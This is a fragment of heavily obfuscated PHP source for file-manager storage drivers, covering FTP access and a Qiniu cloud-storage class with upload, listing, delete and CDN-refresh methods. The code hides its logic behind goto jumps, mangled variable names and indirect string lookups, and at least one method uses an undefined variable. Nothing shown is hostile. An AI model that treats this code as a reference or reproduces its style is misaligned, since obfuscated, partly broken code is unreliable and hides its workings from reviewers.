$_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isconn()) { return !1; } $bô„õ”æ¥ç = $this->iconvSystem($bô„õ”æ¥ç); goto E³Áµ¤±ÓÔ; A†²­¾óÉÜ: foreach ($D´õêÇ‘ê[$B‹Ø£Øóéá[82]] as $DÏğ—ø»Â²) { $B¥Š÷„‹[] = array($B‹Ø£Øóéá[84] => $B‹Ø£Øóéá[8] . trim(str_replace($bô„õ”æ¥ç, $B‹Ø£Øóéá[33], $DÏğ—ø»Â²), $B‹Ø£Øóéá[8]), $B‹Ø£Øóéá[85] => 0, $B‹Ø£Øóéá[86] => $this->size($DÏğ—ø»Â²)); } return $B¥Š÷„‹; goto C®Ÿ¦§Š„; C®Ÿ¦§Š„: } public function getContent($cóëˆÄÑÌ) { if (!$this->_isconn()) { return !1; } $cóëˆÄÑÌ = $this->iconvSystem($cóëˆÄÑÌ); return $this->fileSubstr($cóëˆÄÑÌ); } public function setContent($AÛ©°î°â…, $F‰ºæ…¯ÁË = '') { goto aÒ†°¨ÕØŠ; BÕÕê¥‘è²: file_put_contents($cÖ„“Ù›–, $F‰ºæ…¯ÁË); $F¸¹•Ùäéº = $this->upload($AÛ©°î°â…, $this->iconvApp($cÖ„“Ù›–)); $this->tempFileRemve($cÖ„“Ù›–); goto CÔÕ¸Èšâñ; CÔÕ¸Èšâñ: return $F¸¹•Ùäéº; goto AÑŸÚÍ°; aÒ†°¨ÕØŠ: if (!$this->_isconn()) { return !1; } $C±Ã‡ï¹‚æ = $this->pathThis($this->iconvSystem($AÛ©°î°â…)); $cÖ„“Ù›– = $this->tempFile($C±Ã‡ï¹‚æ); goto BÕÕê¥‘è²; AÑŸÚÍ°: } public function fileSubstr($dÇ ¥Å¬‡°, $Cø‡Äºô…Î = 0, $BáÍÒêÒ¨Ø = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dÇ ¥Å¬‡°, $Cø‡Äºô…Î, $BáÍÒêÒ¨Ø); } private function ftpRequest($d™°¬³°ª, $féâ°å›¢á = 0, $A©ìç³­éõ = false) { goto aÄˆ¦ğ‡¡ê; d¼‘¶Šè¾Î: curl_setopt($B†ôò×ä†ƒ, CURLOPT_RETURNTRANSFER, 1); $B¾¨Ú‰ª„ = curl_exec($B†ôò×ä†ƒ); curl_close($B†ôò×ä†ƒ); goto dÜ¨²‡õ; dÜ¨²‡õ: return $B¾¨Ú‰ª„; goto D²º”Ãî¨ ; aÄˆ¦ğ‡¡ê: $d™°¬³°ª = $this->iconvSystem($d™°¬³°ª); $a­ÒˆŸÊù’ = $this->scheme . $this->host . $_SERVER[°Óó£ÌİóèÅ][4] . $this->port; $B†ôò×ä†ƒ = curl_init(); goto a³•˜È¦ŠÍ; a³•˜È¦ŠÍ: curl_setopt($B†ôò×ä†ƒ, CURLOPT_URL, $a­ÒˆŸÊù’ . $this->pathEncode($d™°¬³°ª)); curl_setopt($B†ôò×ä†ƒ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($A©ìç³­éõ) { $aÇ‚Ô£êí† = $féâ°å›¢á + $A©ìç³­éõ - 1; curl_setopt($B†ôò×ä†ƒ, CURLOPT_RANGE, "{$féâ°å›¢á}\55{$aÇ‚Ô£êí†}"); } goto d¼‘¶Šè¾Î; D²º”Ãî¨ : } public function upload($FÊãëã¯½, $EæÜµØ¹, $b³¾Éøì¦¡ = false, $c…ÒÙôë›½ = REPEAT_REPLACE) { goto eÊãÛŞ³; eÊãÛŞ³: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FÊãëã¯½))) { return !1; } $FÊãëã¯½ = $this->iconvSystem($FÊãëã¯½); goto câ¢«Æİ„Ú; C»©¤²Ì†í: if ($E¿œØ¬Æ‚× != FTP_FINISHED) { return !1; } return $this->getPathOuter($FÊãëã¯½); goto e ¶ã°¦Ó; câ¢«Æİ„Ú: $EæÜµØ¹ = $this->iconvSystem($EæÜµØ¹); $E¿œØ¬Æ‚× = ftp_nb_put($this->connect, $FÊãëã¯½, $EæÜµØ¹, FTP_BINARY); while ($E¿œØ¬Æ‚× == FTP_MOREDATA) { $E¿œØ¬Æ‚× = ftp_nb_continue($this->connect); } goto C»©¤²Ì†í; e ¶ã°¦Ó: } public function download($bÇ ßŒìõ, $dÅŸ¹ˆ´Ñ = '') { goto aÉ¶¿ñ½£; Aİ”êóÌãù: while ($E‹÷áÕ’ == FTP_MOREDATA) { $E‹÷áÕ’ = ftp_nb_continue($this->connect); } if ($E‹÷áÕ’ != FTP_FINISHED) { return !1; } return $this->iconvApp($dÅŸ¹ˆ´Ñ); goto c‡à¬Šğ¥ğ; AÓùì‘î“­: $bÇ ßŒìõ = $this->iconvSystem($bÇ ßŒìõ); $dÅŸ¹ˆ´Ñ = $this->iconvSystem($dÅŸ¹ˆ´Ñ); $E‹÷áÕ’ = ftp_nb_get($this->connect, $dÅŸ¹ˆ´Ñ, $bÇ ßŒìõ, FTP_BINARY); goto Aİ”êóÌãù; aÉ¶¿ñ½£: if (!$this->_isconn()) { return !1; } $FåÌ³œÜ°Ò = $this->pathFather($dÅŸ¹ˆ´Ñ); if (!IO::mkdir($FåÌ³œÜ°Ò)) { return !1; } goto AÓùì‘î“­; c‡à¬Šğ¥ğ: } private function ftpList($dØß½œøæ) { $bƒ½ğå’ŸÉ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isFolder($dØß½œøæ)) { return !1; } @ftp_chdir($this->connect, $bƒ½ğå’ŸÉ[8]); $dØß½œøæ = rtrim($dØß½œøæ, $bƒ½ğå’ŸÉ[8]) . $bƒ½ğå’ŸÉ[8]; $CÔ„»ÚøÈÚ = @ftp_nlist($this->connect, $dØß½œøæ); return array_map(function ($bÈğë›Ë) { $a¿ÃØŒÑÕ =& $_SERVER[°Óó£ÌİóèÅ]; return $a¿ÃØŒÑÕ[8] . ltrim($bÈğë›Ë, $a¿ÃØŒÑÕ[8]); }, $CÔ„»ÚøÈÚ); } private function recursionFtpFiles($FŒíŒ«Ï) { $Fò±ë‡¢ï =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isconn()) { return !1; } if (!($e ¢©ô¨ç = $this->ftpList($FŒíŒ«Ï))) { return !1; } static $dºÅ¹ëÖÛ = array(); foreach ($e ¢©ô¨ç as $FŒíŒ«Ï) { if ($this->_isFolder($FŒíŒ«Ï)) { $this->recursionFtpFiles($FŒíŒ«Ï, $dºÅ¹ëÖÛ); $dºÅ¹ëÖÛ[$Fò±ë‡¢ï[83]][] = $FŒíŒ«Ï; } else { $dºÅ¹ëÖÛ[$Fò±ë‡¢ï[82]][] = $FŒíŒ«Ï; } } return $dºÅ¹ëÖÛ; } } goto B³‚Æ‘¸ Œ; A „­°¯À¯: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($a—òñ±áÒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[°Óó£ÌİóèÅ][949]; $this->_init($a—òñ±áÒ); } public function _init($Eñ¢›ä¦¸ä) { foreach ($Eñ¢›ä¦¸ä as $B’Œíãòæ¿ => $CÆ˜œô©ö‰) { if (isset($this->{$B’Œíãòæ¿})) { $this->{$B’Œíãòæ¿} = $CÆ˜œô©ö‰; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[°Óó£ÌİóèÅ][950], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aÔ’“Ï‡ñ©, $eºë…Ï = '', $cñîÁ…ËÃº = REPEAT_RENAME) { if ($this->setContent($aÔ’“Ï‡ñ©, $eºë…Ï)) { return $this->getPathOuter($aÔ’“Ï‡ñ©); } return !1; } public function mkdir($c†¼Å´Ã¼, $DÀºì¦° = REPEAT_SKIP) { goto bæ¿¶Ê²™; b÷·ò›‹Ç: if (!$this->mkfile($CØ½™¶áÀ)) { return !1; } if (!$this->moveFile($CØ½™¶áÀ, $c†¼Å´Ã¼)) { $this->delFile($CØ½™¶áÀ); return !1; } return $this->getPathOuter($c´×«•©ç‘); goto E¸±äˆ˜ğ; d…²«ŠŞ: $c†¼Å´Ã¼ = $c´×«•©ç‘ . $BéîµÓğ“ê[8]; $e©ÉÓ¢’–ä = get_path_this($c´×«•©ç‘); $CØ½™¶áÀ = $c†¼Å´Ã¼ . $e©ÉÓ¢’–ä; goto b÷·ò›‹Ç; bæ¿¶Ê²™: $BéîµÓğ“ê =& $_SERVER[°Óó£ÌİóèÅ]; $c´×«•©ç‘ = trim($c†¼Å´Ã¼, $BéîµÓğ“ê[8]); if ($this->_isFolder($c´×«•©ç‘)) { return $this->getPathOuter($c´×«•©ç‘); } goto d…²«ŠŞ; E¸±äˆ˜ğ: } public function copyFile($DÑÆæ¡õé, $cÕ«Şå²´Â) { $bÒŸ’°ˆÌ’ = $this->bucketManager->copy($this->bucket, $DÑÆæ¡õé, $this->bucket, $cÕ«Şå²´Â, !0); return $bÒŸ’°ˆÌ’ ? !1 : !0; } public function moveFile($b×âÂ®Û˜ë, $cĞ©‰ÊÆ¿…) { $EÉÜö¹ê²  = $this->bucketManager->move($this->bucket, $b×âÂ®Û˜ë, $this->bucket, $cĞ©‰ÊÆ¿…, !0); return $EÉÜö¹ê²  ? !1 : !0; } public function delFile($a¥‡ëä«‚ô) { $C÷òºÉ“³ = $this->bucketManager->delete($this->bucket, $a¥‡ëä«‚ô); return $C÷òºÉ“³ ? !1 : !0; } public function delFolder($AÙÊ™òŒ³) { $f¥í”â¶Ç» = $this->fileList($AÙÊ™òŒ³); if (empty($f¥í”â¶Ç»)) { return !0; } $bÊ˜â–ã÷Š = 1000; if (count($f¥í”â¶Ç») <= $bÊ˜â–ã÷Š) { return $this->qnDelObj($f¥í”â¶Ç») ? !1 : !0; } foreach (array_chunk($f¥í”â¶Ç», $bÊ˜â–ã÷Š) as $A”Ÿ¼‰Ûë¨) { $F‚Ñ¾¢Æù’ = $this->qnDelObj($A”Ÿ¼‰Ûë¨); if ($F‚Ñ¾¢Æù’) { return !1; } } return !0; } private function qnDelObj($a«éï„îë–) { $c­ÚÔê»À± = $this->bucketManager->buildBatchDelete($this->bucket, $a«éï„îë–); list($B›ÏŒÃê†‡, $eË·‚ôÌ¤) = $this->bucketManager->batch($c­ÚÔê»À±); return $eË·‚ôÌ¤; } private function fileList($dÉ‘‘ù²íÒ, $C»ùÚÕ·Ä´ = 0) { goto dŒ”‘Å¼•š; dŒ”‘Å¼•š: $b ¨¡³Õ‚† =& $_SERVER[°Óó£ÌİóèÅ]; $dÉ‘‘ù²íÒ = trim($dÉ‘‘ù²íÒ, $b ¨¡³Õ‚†[8]); $e—ñšÔÖ‰ = empty($dÉ‘‘ù²íÒ) ? $b ¨¡³Õ‚†[33] : $dÉ‘‘ù²íÒ . $b ¨¡³Õ‚†[8]; goto bùÅÕ£èˆ†; bùÅÕ£èˆ†: $B•¡ïã¨ß¦ = $b ¨¡³Õ‚†[33]; $f‚î‰åˆï = 1000; $FíƒåËƒ˜® = $b ¨¡³Õ‚†[33]; goto cÒ¿ó³ä¼; cÒ¿ó³ä¼: $f¾•–…ïÄ’ = array(); while (!0) { list($b®±ğÔÜÀ, $BŞ¥Šİœ¿) = $this->bucketManager->listFiles($this->bucket, $e—ñšÔÖ‰, $B•¡ïã¨ß¦, $f‚î‰åˆï, $FíƒåËƒ˜®); if ($BŞ¥Šİœ¿) { return !1; } $B•¡ïã¨ß¦ = array_key_exists($b ¨¡³Õ‚†[917], $b®±ğÔÜÀ) ? $B•¡ïã¨ß¦ = $b®±ğÔÜÀ[$b ¨¡³Õ‚†[951]] : $b ¨¡³Õ‚†[33]; foreach ($b®±ğÔÜÀ[$b ¨¡³Õ‚†[952]] as $e¿µæâÙî‰) { $dŸÜ³ÚİÒ = $e¿µæâÙî‰[$b ¨¡³Õ‚†[96]]; if ($C»ùÚÕ·Ä´) { $dŸÜ³ÚİÒ = array($b ¨¡³Õ‚†[28] => $dŸÜ³ÚİÒ, $b ¨¡³Õ‚†[86] => $e¿µæâÙî‰[$b ¨¡³Õ‚†[953]]); } $f¾•–…ïÄ’[] = $dŸÜ³ÚİÒ; } if ($B•¡ïã¨ß¦ == $b ¨¡³Õ‚†[33]) { break; } } return $f¾•–…ïÄ’; goto eÈô‡ƒºÎ; eÈô‡ƒºÎ: } public function rename($E×‹Ù‚¿±, $dÇƒÉ¹Íë) { return $this->renameObject($E×‹Ù‚¿±, $dÇƒÉ¹Íë); } public function size($c™¡¶Ç…ƒÏ) { $dé†Ñ‹ööì =& $_SERVER[°Óó£ÌİóèÅ]; list($eÒÓĞ¾Ú¢à, $A‰Á†¯‰µĞ) = $this->bucketManager->stat($this->bucket, trim($c™¡¶Ç…ƒÏ, $dé†Ñ‹ööì[8])); return isset($eÒÓĞ¾Ú¢à[$dé†Ñ‹ööì[953]]) ? $eÒÓĞ¾Ú¢à[$dé†Ñ‹ööì[953]] : 0; } public function _info($Dâ¯×Û¶Øˆ) { $Dâ¯×Û¶Øˆ = trim($Dâ¯×Û¶Øˆ, $_SERVER[°Óó£ÌİóèÅ][8]); if ($this->_isFolder($Dâ¯×Û¶Øˆ)) { return $this->folderInfo($Dâ¯×Û¶Øˆ); } return $this->fileInfo($Dâ¯×Û¶Øˆ); } public function fileInfo($EñªÏáìšÃ, $a‚Ïª‡»„Ì = array(), $d„×»é„„¸ = false) { goto aÇÇÚæ“ó; aÇÇÚæ“ó: $b‚ó¦Ò£‡ =& $_SERVER[°Óó£ÌİóèÅ]; if ($d„×»é„„¸) { return array($b‚ó¦Ò£‡[28] => $this->pathThis($EñªÏáìšÃ), $b‚ó¦Ò£‡[84] => $this->getPathOuter($b‚ó¦Ò£‡[8] . $EñªÏáìšÃ), $b‚ó¦Ò£‡[29] => $b‚ó¦Ò£‡[172], $b‚ó¦Ò£‡[86] => isset($a‚Ïª‡»„Ì[$b‚ó¦Ò£‡[953]]) ? $a‚Ïª‡»„Ì[$b‚ó¦Ò£‡[953]] : 0, $b‚ó¦Ò£‡[165] => $this->ext($EñªÏáìšÃ)); } $C‚Ä‡ë„®¡ = array($b‚ó¦Ò£‡[28] => $this->pathThis($EñªÏáìšÃ), $b‚ó¦Ò£‡[84] => $this->getPathOuter($b‚ó¦Ò£‡[8] . $EñªÏáìšÃ), $b‚ó¦Ò£‡[29] => $b‚ó¦Ò£‡[172], $b‚ó¦Ò£‡[195] => $b‚ó¦Ò£‡[50], $b‚ó¦Ò£‡[114] => $b‚ó¦Ò£‡[50], $b‚ó¦Ò£‡[86] => 0, $b‚ó¦Ò£‡[165] => $this->ext($EñªÏáìšÃ), $b‚ó¦Ò£‡[196] => !0, $b‚ó¦Ò£‡[197] => !0); goto D–Ñæ²Ò¾î; cóšİ”õ¢ä: return $C‚Ä‡ë„®¡; goto e…ä‚†õ¶Ù; D–Ñæ²Ò¾î: if (empty($a‚Ïª‡»„Ì)) { list($a‚Ïª‡»„Ì, $F²¦àÒˆ÷…) = $this->bucketManager->stat($this->bucket, $EñªÏáìšÃ); if ($F²¦àÒˆ÷…) { return $C‚Ä‡ë„®¡; } $this->fileInfoImage($EñªÏáìšÃ, $C‚Ä‡ë„®¡); } $C‚Ä‡ë„®¡[$b‚ó¦Ò£‡[195]] = substr($a‚Ïª‡»„Ì[$b‚ó¦Ò£‡[954]], 0, -7); $C‚Ä‡ë„®¡[$b‚ó¦Ò£‡[86]] = $a‚Ïª‡»„Ì[$b‚ó¦Ò£‡[953]]; goto cóšİ”õ¢ä; e…ä‚†õ¶Ù: } public function folderInfo($A‹‹Œæ¶ªà, $dÎ¼ª¡‹ = false) { $dê¤ÙÍíã =& $_SERVER[°Óó£ÌİóèÅ]; if ($dÎ¼ª¡‹) { return array($dê¤ÙÍíã[28] => $this->pathThis($A‹‹Œæ¶ªà), $dê¤ÙÍíã[84] => $this->getPathOuter($dê¤ÙÍíã[8] . $A‹‹Œæ¶ªà), $dê¤ÙÍíã[29] => $dê¤ÙÍíã[85]); } $d‘Œñ‘Ï¼‡ = array($dê¤ÙÍíã[28] => $this->pathThis($A‹‹Œæ¶ªà), $dê¤ÙÍíã[84] => $this->getPathOuter($dê¤ÙÍíã[8] . $A‹‹Œæ¶ªà), $dê¤ÙÍíã[29] => $dê¤ÙÍíã[85], $dê¤ÙÍíã[195] => $dê¤ÙÍíã[50], $dê¤ÙÍíã[114] => $dê¤ÙÍíã[50], $dê¤ÙÍíã[894] => !0, $dê¤ÙÍíã[895] => !0); return $d‘Œñ‘Ï¼‡; } public function exist($AÌ÷ĞÅé¼Š) { if ($this->_isFile($AÌ÷ĞÅé¼Š) || $this->_isFolder($AÌ÷ĞÅé¼Š)) { return !0; } return !1; } public function info($e¡…¡ – ) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][191], $e¡…¡ – ); } public function isFile($EºæÏíçó’) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][192], $EºæÏíçó’); } public function isFolder($d™„ÌµÎ) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][193], $d™„ÌµÎ); } public function _isFile($aÏö°ß÷À) { list($fö ˆ¡ÁÒ, $Dî´Üˆ«äµ) = $this->bucketManager->stat($this->bucket, trim($aÏö°ß÷À, $_SERVER[°Óó£ÌİóèÅ][8])); return $Dî´Üˆ«äµ ? !1 : !0; } public function _isFolder($bÈ‰øÃëŞŠ) { goto Dß¤Ş«ÎÂ; F¶ÏÇƒ—²: $fÁ“’„Ì­­ = $AŒãˆ·Æ‡¶[8]; list($fÊ‚£°ÕË¾, $BÎšÁ¦Ï—ì) = $this->bucketManager->listFiles($this->bucket, $cåÁ ÖÒ‰ß, $dÁÓŞÆ¹Ì, $BğçâŞ¦Î›, $fÁ“’„Ì­­); if (!empty($fÊ‚£°ÕË¾[$AŒãˆ·Æ‡¶[952]]) || !empty($fÊ‚£°ÕË¾[$AŒãˆ·Æ‡¶[955]])) { return !0; } goto Aø¶—Øœ»; DÇšæ¤Åá: $cåÁ ÖÒ‰ß = trim($bÈ‰øÃëŞŠ, $AŒãˆ·Æ‡¶[8]) . $AŒãˆ·Æ‡¶[8]; $dÁÓŞÆ¹Ì = $AŒãˆ·Æ‡¶[33]; $BğçâŞ¦Î› = 1; goto F¶ÏÇƒ—²; Aø¶—Øœ»: return !1; goto fé¬„ò„‚; Dß¤Ş«ÎÂ: $AŒãˆ·Æ‡¶ =& $_SERVER[°Óó£ÌİóèÅ]; $fá“Ó»ëµ = trim($bÈ‰øÃëŞŠ, $AŒãˆ·Æ‡¶[8]); if (empty($fá“Ó»ëµ)) { return !0; } goto DÇšæ¤Åá; fé¬„ò„‚: } public function listPath($aóšŒóäÉ², $BÁ´èæñµ· = false) { goto cÖ†ˆ„ôîÜ; fİÂñï¢‘Å: $c×Á§õÂÖÎ = $a×ì„³ŞÚ = array(); while (!0) { list($c¿ÂÃŸ¡ªÀ, $Bæ§è“–ƒ³) = $this->bucketManager->listFiles($this->bucket, $F ©÷ƒŸŒŞ, $A”‰¸’°˜, $E©Öæ¯«—, $D›íŞ÷´†); if ($Bæ§è“–ƒ³) { return !1; } $A”‰¸’°˜ = array_key_exists($aÄ‰Í­å©ô[917], $c¿ÂÃŸ¡ªÀ) ? $A”‰¸’°˜ = $c¿ÂÃŸ¡ªÀ[$aÄ‰Í­å©ô[951]] : $aÄ‰Í­å©ô[33]; if (isset($c¿ÂÃŸ¡ªÀ[$aÄ‰Í­å©ô[955]])) { foreach ($c¿ÂÃŸ¡ªÀ[$aÄ‰Í­å©ô[955]] as $F¡Øò‡øƒ) { if ($F¡Øò‡øƒ == $F ©÷ƒŸŒŞ) { continue; } $c×Á§õÂÖÎ[] = $this->folderInfo($F¡Øò‡øƒ, $BÁ´èæñµ·); } } if (isset($c¿ÂÃŸ¡ªÀ[$aÄ‰Í­å©ô[952]])) { foreach ($c¿ÂÃŸ¡ªÀ[$aÄ‰Í­å©ô[952]] as $a÷ÙĞçÎ‚”) { if ($a÷ÙĞçÎ‚”[$aÄ‰Í­å©ô[96]] == $F ©÷ƒŸŒŞ) { continue; } $a×ì„³ŞÚ[] = $this->fileInfo($a÷ÙĞçÎ‚”[$aÄ‰Í­å©ô[96]], $a÷ÙĞçÎ‚”, $BÁ´èæñµ·); } } if ($A”‰¸’°˜ == $aÄ‰Í­å©ô[33]) { break; } } return array($aÄ‰Í­å©ô[83] => $c×Á§õÂÖÎ, $aÄ‰Í­å©ô[82] => $a×ì„³ŞÚ); goto D˜íŸÌ÷»ç; cÖ†ˆ„ôîÜ: $aÄ‰Í­å©ô =& $_SERVER[°Óó£ÌİóèÅ]; $aóšŒóäÉ² = trim($aóšŒóäÉ², $aÄ‰Í­å©ô[8]); $F ©÷ƒŸŒŞ = empty($aóšŒóäÉ²) ? $aÄ‰Í­å©ô[33] : $aóšŒóäÉ² . $aÄ‰Í­å©ô[8]; goto a‹Ê¹ÄõÄÒ; a‹Ê¹ÄõÄÒ: $A”‰¸’°˜ = $aÄ‰Í­å©ô[33]; $E©Öæ¯«— = 1000; $D›íŞ÷´† = $aÄ‰Í­å©ô[8]; goto fİÂñï¢‘Å; D˜íŸÌ÷»ç: } public function has($d™‰¦ÙÛÆ¨, $aˆ®ËøòÏƒ = false, $eÕÃªÑ½Ã = true) { goto f„¥Ş‡ÂèÒ; dÇÊİš—Åå: $c æùìÛÙ = 0; $D²Ü¯µĞ = 0; while (!0) { list($b‘¾½ñÇ°Û, $DéÉ¨÷ÃØ×) = $this->bucketManager->listFiles($this->bucket, $eîóÚËòÉ™, $DÔØ·ŒÉ•, $AæŠ’Šó•Ü, $DÏ‹æİÊš²); if ($DéÉ¨÷ÃØ×) { return !1; } $DÔØ·ŒÉ• = array_key_exists($Aø¹É‰£Ï»[917], $b‘¾½ñÇ°Û) ? $DÔØ·ŒÉ• = $b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[951]] : $Aø¹É‰£Ï»[33]; if ($aˆ®ËøòÏƒ) { if (!empty($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[952]])) { $c æùìÛÙ += count($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[952]]); } if (!empty($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[955]])) { $D²Ü¯µĞ += count($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[955]]); } if ($DÔØ·ŒÉ• === $Aø¹É‰£Ï»[33]) { break; } continue; } if ($eÕÃªÑ½Ã) { if (!empty($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[952]])) { return !0; } } else { if (!empty($b‘¾½ñÇ°Û[$Aø¹É‰£Ï»[955]])) { return !0; } } if ($DÔØ·ŒÉ• == $Aø¹É‰£Ï»[33]) { break; } } goto fë½ó…‘™; fë½ó…‘™: if ($aˆ®ËøòÏƒ) { return array($Aø¹É‰£Ï»[199] => $c æùìÛÙ, $Aø¹É‰£Ï»[200] => $D²Ü¯µĞ); } return !1; goto A’ ×ñÂ«•; a£Ÿ‹Ìã: $DÔØ·ŒÉ• = $Aø¹É‰£Ï»[33]; $AæŠ’Šó•Ü = 500; $DÏ‹æİÊš² = $Aø¹É‰£Ï»[8]; goto dÇÊİš—Åå; f„¥Ş‡ÂèÒ: $Aø¹É‰£Ï» =& $_SERVER[°Óó£ÌİóèÅ]; $d™‰¦ÙÛÆ¨ = trim($d™‰¦ÙÛÆ¨, $Aø¹É‰£Ï»[8]); $eîóÚËòÉ™ = empty($d™‰¦ÙÛÆ¨) ? $Aø¹É‰£Ï»[33] : $d™‰¦ÙÛÆ¨ . $Aø¹É‰£Ï»[8]; goto a£Ÿ‹Ìã; A’ ×ñÂ«•: } public function listAll($F“ù‹†Ò) { $a×’°°±›¢ =& $_SERVER[°Óó£ÌİóèÅ]; $b¾—†¯šó = $this->fileList($F“ù‹†Ò, 1); $cÄÉ­ó‚© = array(); foreach ($b¾—†¯šó as $cŠÓ…Á) { $cÄÉ­ó‚©[$cŠÓ…Á[$a×’°°±›¢[28]]] = $cŠÓ…Á[$a×’°°±›¢[86]]; } return $this->listAllFiles($F“ù‹†Ò, array_keys($cÄÉ­ó‚©), $cÄÉ­ó‚©); } public function canRead($eÉ¯­·æê) { return $this->exist($eÉ¯­·æê) ? !0 : !1; } public function canWrite($CÓˆŞå¥Öì) { return $this->exist($CÓˆŞå¥Öì) ? !0 : !1; } public function getContent($BÂÑ·œË ) { return $this->fileSubstr($BÂÑ·œË , 0, -1); } public function setContent($f‘Ğ™÷³Ùõ, $FíĞ°˜Ö = '') { $Fà¯Ãõ ø = $this->tempFile($this->pathThis($f‘Ğ™÷³Ùõ)); file_put_contents($Fà¯Ãõ ø, $FíĞ°˜Ö); if ($this->upload($f‘Ğ™÷³Ùõ, $Fà¯Ãõ ø)) { $this->tempFileRemve($Fà¯Ãõ ø); return !0; } return !1; } public function refreshUrls($Ağïµ‰Šßö) { goto f¡ºƒ•‡÷á; dî´Ÿœ‡¼: return $AÛÛˆ˜ïŒ[$CÈŞ›—‚òø[956]] == $CÈŞ›—‚òø[461] ? !0 : !1; goto e´Êâµìâƒ; f¡ºƒ•‡÷á: $CÈŞ›—‚òø =& $_SERVER[°Óó£ÌİóèÅ]; $dÓ²ââ¥¾• = array(); if (is_array($Ağïµ‰Šßö)) { foreach ($Ağïµ‰Šßö as $b¡±Ú‰çğ¬) { $dÓ²ââ¥¾•[] = $this->link($b¡±Ú‰çğ¬); } } else { $dÓ²ââ¥¾•[] = $this->link($Ağïµ‰Šßö); } goto A ¸‡Î­Ë; A ¸‡Î­Ë: $dË˜Ö­â™Œ = new Qiniu\Cdn\CdnManager($this->auth); list($AÛÛˆ˜ïŒ, $cİéƒ‘®¼ò) = $dË˜Ö­â™Œ->refreshUrls($dÓ²ââ¥¾•); if ($cİéƒ‘®¼ò) { return !1; } goto dî´Ÿœ‡¼; e´Êâµìâƒ: } public function fileSubstr($dÉ“®¾ÓÛ¼, $FÓãáº—ä, $BÂÏÉ·Øì¡) { $dê°î¹™®† =& $_SERVER[°Óó£ÌİóèÅ]; if (!($cºŞ¤İ…ì¾ = $this->link($dÉ“®¾ÓÛ¼))) { return !1; } $aï†‘¨­¦è = array($dê°î¹™®†[920] => $FÓãáº—ä, $dê°î¹™®†[336] => $BÂÏÉ·Øì¡); return $this->qnRequest($cºŞ¤İ…ì¾, $aï†‘¨­¦è); } public function upload($DÜøË§§ù¨, $e¸¸î‹©ÂÀ, $bŞå‰øÖ´Í = false, $CÅ´µˆ¯¸Ñ = REPEAT_REPLACE) { $F¯ğÈæìé† = new Qiniu\Storage\UploadManager(); $aÛƒ§˜ù˜Ş = $this->auth->uploadToken($this->bucket, $DÜøË§§ù¨); $eÌ¤¨é‹°Ù = get_file_mime(get_path_ext($a”ë›»˜Ì)); list($A¡”­õ±É, $E÷‹‰™ä…) = $F¯ğÈæìé†->putFile($aÛƒ§˜ù˜Ş, $DÜøË§§ù¨, $e¸¸î‹©ÂÀ, null, $eÌ¤¨é‹°Ù); return $E÷‹‰™ä… ? !1 : $this->getPathOuter($DÜøË§§ù¨); } public function uploadFormData($bãø†„‘¹š, $c‚®ŠÇ¿¨“ = 3600) { return $this->uploadToken($bãø†„‘¹š, $c‚®ŠÇ¿¨“); } public function multiUploadFormData($F÷šˆÓ¸»Ñ, $b¶¨¨Ÿñ…Æ = 3600) { return $this->uploadToken($F÷šˆÓ¸»Ñ, $b¶¨¨Ÿñ…Æ); } private function uploadToken($b›ˆØâíøí, $a ¼­¿›ÖÏ = 3600) { goto cƒÌÙÔ†˜; cÒ“à±ô„í: $bëß¦ËİÙ¦ = null; $fñÕ¬ªŞô® = $this->auth->uploadToken($this->bucket, $bëß¦ËİÙ¦, $dºÕµ¯ˆŞ¸, $c¸©ñ¡åâŞ, !0); $Bïù‰‹Ç“” = empty($this->region) || $this->region == $F§Õ‘ŞöÙ[959] ? $F§Õ‘ŞöÙ[33] : $F§Õ‘ŞöÙ[506] . $this->region; goto C„Œ˜ˆ‡ï; C„Œ˜ˆ‡ï: $c‚¸¥õè´¿ = http_type() . "\x3a\x2f\57\165\x70\154\157\x61\144{$Bïù‰‹Ç“”}\x2e\161\151\156\151\x75\x70\x2e\143\157\155\x2f"; return array($F§Õ‘ŞöÙ[960] => $fñÕ¬ªŞô®, $F§Õ‘ŞöÙ[961] => $c‚¸¥õè´¿); goto EÇà±„É‹Ş; cƒÌÙÔ†˜: $F§Õ‘ŞöÙ =& $_SERVER[°Óó£ÌİóèÅ]; $dºÕµ¯ˆŞ¸ = $a ¼­¿›ÖÏ; $c¸©ñ¡åâŞ = array($F§Õ‘ŞöÙ[957] => $F§Õ‘ŞöÙ[958]); goto cÒ“à±ô„í; EÇà±„É‹Ş: } public function download($B”›–Å½À›, $cŠ…êôß­) { goto fÓ¥­ŠÍƒÂ; Dİ¡®“Ì­: while (!0) { $BÊâŠ ½ÀÃ = array($A§ø‹øğ¼[920] => $d‹ªö„‡ô„, $A§ø‹øğ¼[336] => $cõ‰½Àè†ô); $FÒé£ÒÖÜ = $this->qnRequest($bÓº²´¨«, $BÊâŠ ½ÀÃ); if ($d‹ªö„‡ô„ && ($aî÷Ë¬² = @json_decode($FÒé£ÒÖÜ, !0))) { if (isset($aî÷Ë¬²[$A§ø‹øğ¼[956]])) { return !1; } } fwrite($Eæ³º¶ßâ£, $FÒé£ÒÖÜ); $d‹ªö„‡ô„ += $cõ‰½Àè†ô; if 